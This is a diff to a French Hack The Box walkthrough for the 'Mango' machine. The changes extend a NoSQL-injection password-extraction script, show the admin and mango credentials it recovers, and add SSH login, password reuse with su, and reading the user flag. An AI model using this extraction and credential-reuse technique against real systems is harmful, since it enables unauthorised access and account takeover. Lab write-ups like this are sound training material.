@@ -939,9 +939,22 @@ for character in characters:
         if username not in users:
             users.append(username)
 
+results = []
+
 for username in users:
     password = extract_password(username)
+    results.append((username, password))
     print(f"[+] {username}:{password}")
+
+print()
+print("+----------+------------------+")
+print("| Username | Password         |")
+print("+----------+------------------+")
+
+for username, password in results:
+    print(f"| {username:<8} | {password:<16} |")
+
+print("+----------+------------------+")
 ```
 
 La fonction `valid()` envoie la requête sans suivre automatiquement les redirections. Une réponse `302` peut ainsi être utilisée directement comme indicateur qu’un préfixe correspond.
@@ -970,7 +983,7 @@ python3 nosqli_extract.py
 
 tu donne :
 
-```bash
+```txt
 [+] Username: ad
 [+] Username: adm
 [+] Username: admi
@@ -1009,6 +1022,13 @@ tu donne :
 [+] mango password: h3mXK8RhU~f{]f5
 [+] mango password: h3mXK8RhU~f{]f5H
 [+] mango:h3mXK8RhU~f{]f5H
+
++----------+------------------+
+| Username | Password         |
++----------+------------------+
+| admin    | t9KcS3>!0B#2     |
+| mango    | h3mXK8RhU~f{]f5H |
++----------+------------------+
 ```
 
 L’exécution du script t’a permis d’identifier progressivement deux noms d’utilisateur :
@@ -1035,23 +1055,83 @@ Ces comptes peuvent maintenant être testés sur les autres services exposés pa
 
 ### Connexion SSH
 
-#### Validation des identifiants récupérés
+Les identifiants récupérés peuvent maintenant être testés sur le service SSH exposé sur le port `22`.
 
-#### Premier accès à la machine
+Une première tentative avec le compte `admin` échoue :
 
-### Passage vers un second compte utilisateur
+```bash
+ssh admin@mango.htb
+```
 
-#### Recherche de `user.txt`
+Tu peux alors essayer le second compte découvert :
 
-#### Analyse des permissions de `/home/admin`
+```
+ssh mango@mango.htb
+```
 
-#### Réutilisation des identifiants récupérés
+Cette fois, l’authentification fonctionne avec le mot de passe récupéré précédemment.
 
-#### Accès au compte `admin`
+Une fois connecté, tu peux rechercher le fichier `user.txt` :
 
-#### Lecture de `user.txt`
+```bash
+find / -name user.txt 2>/dev/null
+```
 
----
+Le fichier se trouve dans :
+
+```
+/home/admin/user.txt
+```
+
+Le compte `mango` n’a cependant pas directement accès au contenu du répertoire personnel de `admin`.
+
+```bash
+ls -la /home/admin
+```
+
+donne :
+
+```bash
+drwxr-xr-x 2 admin admin 4096 Oct 23  2023 .
+drwxr-xr-x 4 root  root  4096 Oct 23  2023 ..
+lrwxrwxrwx 1 admin admin    9 Sep 27  2019 .bash_history -> /dev/null
+-rw-r--r-- 1 admin admin  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 admin admin 3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 admin admin  807 Apr  4  2018 .profile
+-r-------- 1 admin admin   33 Aug 29 15:04 user.txt
+```
+
+Les permissions `-r--------` indiquent que seul l’utilisateur `admin` peut lire `user.txt`.
+
+Tu peux alors tester la réutilisation du mot de passe récupéré pour le compte `admin` :
+
+```bash
+su admin
+```
+
+L’authentification réussit et tu bascules sur le compte `admin`.
+
+La session obtenue utilise un shell `sh` :
+
+```sh
+$ echo $0
+sh
+```
+
+Pour bénéficier d’un environnement plus confortable, lance :
+
+```sh
+bash
+```
+
+### Lecture de `user.txt`
+
+Tu peux ensuite lire le flag utilisateur :
+
+```bash
+admin@mango:/home/mango$ cat /home/admin/user.txt
+4bb2xxxxxxxxxxxxxxxxxxxxxxxxxxxbe57
+```
 
 ## Escalade de privilèges
 
